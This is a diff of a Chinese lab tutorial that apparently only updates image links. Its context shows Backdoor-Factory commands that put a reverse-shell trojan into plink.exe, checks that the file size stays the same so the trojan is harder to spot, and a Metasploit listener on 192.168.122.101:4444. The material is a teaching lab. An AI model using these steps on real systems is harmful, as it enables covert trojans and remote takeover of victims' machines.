@@ -31,7 +31,7 @@
 | 另一台虚拟机 | `Metasploitable2` | `msfadmin` | `msfadmin` |
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1482822320014.png-wm)
+![图片描述](../imgs/1482822320014.png-wm.png)
 
 
 ## 二、启动环境
@@ -49,7 +49,7 @@ ssh root@Kali
 ```
 **注意：在这步 `ssh root@Kali` 中，可能会出现报错，这是因为打开 Kali 后，需要等待大概`一分钟左右`，服务才会真正开启**如果一切顺利，你将会看到如下页面：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481188145695.png-wm)
+![图片描述](../imgs/1481188145695.png-wm_2.png)
 
 
 ## 三、原理介绍
@@ -64,7 +64,7 @@ Backdoor-Factory 向正常的程序中植入木马，植入过程中不破坏程
 
 在使用 Backdoor-Factory 之前，我们先对 Backdoor-Factory 参数含义进行一个了解。在 Kali Linux 实验楼终端中，可以输入 `backdoor-factory` 可以查看工具的帮助命令：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482306854409.png-wm)
+![图片描述](../imgs/1482306854409.png-wm.png)
 
 其中对于 `backdoor-factory` 常用的命令参数含义如下列表：
 
@@ -92,7 +92,7 @@ Backdoor-Factory 向正常的程序中植入木马，植入过程中不破坏程
 backdoor-factory -f /usr/share/windows-binaries/plink.exe -s show
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482893251799.png-wm)
+![图片描述](../imgs/1482893251799.png-wm.png)
 
 由上图输出的信息可以知道，我们可以使用的 Shellcode 模块共有 9 个，每个 Shellcode 功能不尽相同：
 
@@ -118,7 +118,7 @@ backdoor-factory -f /usr/share/windows-binaries/plink.exe -s reverse_shell_tcp_i
 
 在输入命令后，可以看到如下代码可利用的漏洞：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482894341133.png-wm)
+![图片描述](../imgs/1482894341133.png-wm.png)
 
 其中 `[!] Enter your selection: ` 这段代码的意思是选择你要利用的漏洞，`这里我们输入 2`，即使用第二个漏洞的意思，由最后一句代码 `File plink.exe is in the 'backdoored' directory` 知道生成的程序在文件夹 `backdoored` 下。
 
@@ -133,7 +133,7 @@ backdoor-factory -f /usr/share/windows-binaries/plink.exe -s reverse_shell_tcp_i
 File plink.exe is in the 'backdoored' directory
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482894462113.png-wm)
+![图片描述](../imgs/1482894462113.png-wm.png)
 
 通过 `ls -l` 命令对比正常程序和木马程序两者之间的大小，在命令行终端中输入如下命令：
 
@@ -146,7 +146,7 @@ ls -l /usr/share/windows-binaries/plink.exe
 # 查看植入正常程序的木马程序大小
 ls -l backdoored/plink.exe
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482895030653.png-wm)
+![图片描述](../imgs/1482895030653.png-wm.png)
 
 由上面的 ls 可以发现植入木马后，程序大小并未发生变化，这对于隐藏木马是非常有利的。接着我们使用工具 `md5sum` 可以对两个程序的前后结构进行对比，查看是否已经改变。
 
@@ -159,7 +159,7 @@ md5sum /usr/share/windows-binaries/plink.exe
 # 查看生成的木马文件的 md5
 md5sum backdoored/plink.exe
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482894865550.png-wm)
+![图片描述](../imgs/1482894865550.png-wm.png)
 
 
 接着将开启 `msfconsole`，并且使用相关模块进行监听。在 Kali Linux 命令行终端中输入命令：
@@ -179,7 +179,7 @@ msf > set lhost 192.168.122.101
 msf > set lport 4444
 msf > exploit
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482907669343.png-wm)
+![图片描述](../imgs/1482907669343.png-wm.png)
 
 
 输入完命令之后，攻击者的主机进入侦听状态。接下来只要将文件夹 `backdoored` 下的木马文件 `plink.exe` 上传至目标靶机（Windows 操作系统），只要目标靶机上的用户运行木马程序 `plink.exe`，即可建立起目标靶机和攻击机两者之间的联系，此时会在 msfconsole 命令行终端中会获得目标靶机与攻击机的 shell 会话通道。由于实验楼没有安装 Windows 系统，所以这一步步骤在这里不进行演示。
@@ -192,7 +192,7 @@ msf > exploit
 
 最后开启 msfconsole 进行监听，此时将木马文件上传到目标靶机，只要目标靶机上的管理员点击该木马程序，则建立起会话通道，攻击者获得目标靶机管理权限。文章结构为：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482907365256.png-wm)
+![图片描述](../imgs/1482907365256.png-wm.png)
 
 
 ## 六、课后作业
